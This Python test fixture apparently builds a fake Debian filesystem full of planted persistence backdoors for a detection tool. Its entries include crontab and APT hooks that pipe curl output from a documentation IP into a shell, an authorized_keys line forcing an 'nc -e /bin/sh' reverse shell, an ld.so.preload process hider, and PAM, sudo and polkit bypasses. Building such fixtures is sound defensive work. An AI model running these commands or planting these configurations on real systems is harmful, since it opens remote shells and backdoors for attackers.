"""Generate a fake Linux installation tree with planted (harmless) persistence entries.

Nothing here is executable malware: commands point at non-existent paths or
documentation IP addresses (RFC 5737) and are never run.
"""

from __future__ import annotations

import os
from pathlib import Path

SSH_KEY = "AAAAC3NzaC1lZDI1NTE5AAAAIGJ0ZXN0a2V5Zm9yb2Zmc2NhbnVuaXR0ZXN0c29ubHkx"

FILES: dict[str, str] = {
    "etc/os-release": 'NAME="Debian GNU/Linux"\nID=debian\nVERSION_ID="13"\nPRETTY_NAME="Debian GNU/Linux 13"\n',
    "etc/passwd": "root:x:0:0:root:/root:/bin/bash\n"
                  "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
                  "www-data:x:33:33:www-data:/var/www:/bin/bash\n"
                  "bob:x:1000:1000:Bob:/home/bob:/bin/bash\n"
                  "toor:x:0:0::/root:/bin/bash\n",
    "etc/shadow": "root:$6$abc$def:20000:0:99999:7:::\n"
                  "daemon:*:20000:0:99999:7:::\n"
                  "www-data:$6$aaa$bbb:20000:0:99999:7:::\n"
                  "bob:$y$j9T$xyz:20000:0:99999:7:::\n"
                  "toor::20000:0:99999:7:::\n",
    "etc/group": "root:x:0:\nsudo:x:27:bob\nbob:x:1000:\n",
    "etc/crontab": "SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n"
                   "17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly\n"
                   "*/5 * * * * root curl -s http://198.51.100.7/x.sh | bash\n",
    "etc/cron.d/e2scrub_all": "30 3 * * 0 root test -e /run/systemd/system || "
                              "SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron\n",
    "var/spool/cron/crontabs/bob": "# DO NOT EDIT\n@reboot /home/bob/.cache/.x/run\n",
    "var/spool/cron/atjobs/.SEQ": "0000a\n",
    "var/spool/cron/atjobs/a0000101a": "#!/bin/sh\n/usr/bin/true\n",
    "etc/systemd/system/evil.service": "[Unit]\nDescription=Helper\n[Service]\nExecStart=/tmp/.x/payload --daemon\n"
                                       "Restart=always\n[Install]\nWantedBy=multi-user.target\n",
    "etc/systemd/system/backup.service": "[Service]\nType=oneshot\nExecStart=/usr/local/bin/backup.sh\n",
    "etc/systemd/system/backup.timer": "[Timer]\nOnCalendar=daily\n[Install]\nWantedBy=timers.target\n",
    "etc/systemd/system/nginx.service.d/override.conf":
        "[Service]\nExecStartPre=/usr/bin/python3 -c 'import socket,os;s=socket.socket()'\n",
    "usr/lib/systemd/system/ssh.service": "[Service]\nExecStart=/usr/sbin/sshd -D $SSHD_OPTS\n",
    "usr/lib/systemd/system/getty@.service": "[Service]\nExecStart=-/sbin/agetty -o '-p -- \\\\u' %I $TERM\n",
    "etc/ld.so.preload": "/usr/lib/libprocesshider.so\n",
    "etc/ld.so.conf.d/x86_64-linux-gnu.conf": "/usr/local/lib/x86_64-linux-gnu\n/lib/x86_64-linux-gnu\n",
    "etc/ssh/sshd_config": "Include /etc/ssh/sshd_config.d/*.conf\nPermitRootLogin yes\nPermitEmptyPasswords no\n",
    "etc/ssh/sshd_config.d/10-keys.conf": "AuthorizedKeysFile\t/etc/ssh/keys/%u\n",
    "home/bob/.ssh/authorized_keys": f"ssh-ed25519 {SSH_KEY} bob@laptop\n"
                                     f'command="nc -e /bin/sh 192.0.2.10 4444",no-pty ssh-ed25519 {SSH_KEY} x\n',
    "var/www/.ssh/authorized_keys": f"ssh-ed25519 {SSH_KEY} deploy\n",
    "home/bob/.bashrc": "# ~/.bashrc\nexport HISTSIZE=1000\nalias ll='ls -l'\nalias sudo='/tmp/.s/sudo'\n",
    "home/bob/.config/autostart/updater.desktop": "[Desktop Entry]\nType=Application\n"
                                                  "Exec=/home/bob/.local/bin/upd --quiet %U\n",
    "etc/xdg/autostart/print-applet.desktop": "[Desktop Entry]\nExec=system-config-printer-applet\n",
    "etc/profile.d/path.sh": "export PATH=$PATH:/opt/tools/bin\n",
    "etc/pam.d/sshd": "@include common-auth\nauth sufficient pam_permit.so\n"
                      "session optional pam_exec.so expose_authtok /usr/local/bin/log-login\n"
                      "auth required /tmp/pam_evil.so\n",
    "etc/pam.d/common-auth": "auth [success=1 default=ignore] pam_unix.so nullok\nauth requisite pam_deny.so\n"
                             "auth required pam_permit.so\n",
    "etc/sudoers": "Defaults env_reset\nroot ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\n#includedir /etc/sudoers.d\n",
    "etc/sudoers.d/90-web": "www-data ALL=(ALL) NOPASSWD: ALL\n",
    "etc/udev/rules.d/99-usb.rules": 'ACTION=="add", SUBSYSTEM=="usb", RUN+="/usr/local/bin/usb-hook.sh"\n',
    "usr/lib/udev/rules.d/60-vendor.rules": 'KERNEL=="sd*", IMPORT{program}="/usr/lib/udev/ata_id --export $devnode"\n',
    "etc/apt/apt.conf.d/99update": 'APT::Update::Pre-Invoke {"curl -s http://198.51.100.7/a | sh";};\n',
    "etc/apt/apt.conf.d/50command-not-found":
        'APT::Update::Post-Invoke-Success {"if /usr/bin/test -w /var/lib/command-not-found/ ; then '
        '/usr/lib/cnf-update-db > /dev/null; fi";};\n',
    "etc/modprobe.d/blacklist.conf": "install usb-storage /bin/false\ninstall floppy /usr/local/bin/ld.sh\n",
    "etc/default/grub": 'GRUB_DEFAULT=0\nGRUB_CMDLINE_LINUX="quiet init=/usr/local/sbin/init2"\n',
    "etc/polkit-1/rules.d/49-all.rules": "polkit.addRule(function(action, subject) {\n"
                                         "    return polkit.Result.YES;\n});\n",
    "etc/rc.local": "#!/bin/sh -e\n/usr/local/bin/startup &\nexit 0\n",
    "usr/share/dbus-1/system-services/org.freedesktop.UDisks2.service":
        "[D-BUS Service]\nName=org.freedesktop.UDisks2\nExec=/usr/libexec/udisks2/udisksd\nUser=root\n",
    "home/bob/.local/share/dbus-1/services/org.example.Helper.service":
        "[D-BUS Service]\nName=org.example.Helper\nExec=/home/bob/.cache/.h/helper\n",
    "etc/initramfs-tools/hooks/netcat": "#!/bin/sh\ncopy_exec /usr/bin/nc /bin\n",
    "etc/update-motd.d/10-help-text": "#!/bin/sh\nprintf 'Documentation: https://help.example\\n'\n",
}


def build_linux_root(root: Path) -> Path:
    for rel, content in FILES.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content)
    (root / "etc/shadow").chmod(0o640)
    (root / "var/spool/cron/crontabs/bob").chmod(0o600)
    (root / "etc/sudoers.d/90-web").chmod(0o440)
    wants = root / "etc/systemd/system/multi-user.target.wants"
    wants.mkdir(parents=True)
    (wants / "evil.service").symlink_to("/etc/systemd/system/evil.service")
    (wants / "rogue.service").symlink_to("/opt/.cache/rogue.service")
    getty = root / "etc/systemd/system/getty.target.wants"
    getty.mkdir(parents=True)
    (getty / "getty@tty1.service").symlink_to("/usr/lib/systemd/system/getty@.service")
    (root / "lib").symlink_to("usr/lib")                  # merged /usr
    (root / "tmp/...").mkdir(parents=True)
    (root / "tmp/.../stash").write_bytes(b"x")
    (root / "dev").mkdir()
    (root / "dev/.hidden-config").write_bytes(b"data")
    payload = root / "tmp/payload"
    payload.write_bytes(b"\x7fELF" + b"\0" * 60)
    payload.chmod(0o755)
    for directory in ("root", "var/tmp", "usr/bin"):
        (root / directory).mkdir(parents=True, exist_ok=True)
    os.utime(root / "etc/crontab", (1_700_000_000, 1_700_000_000))
    return root
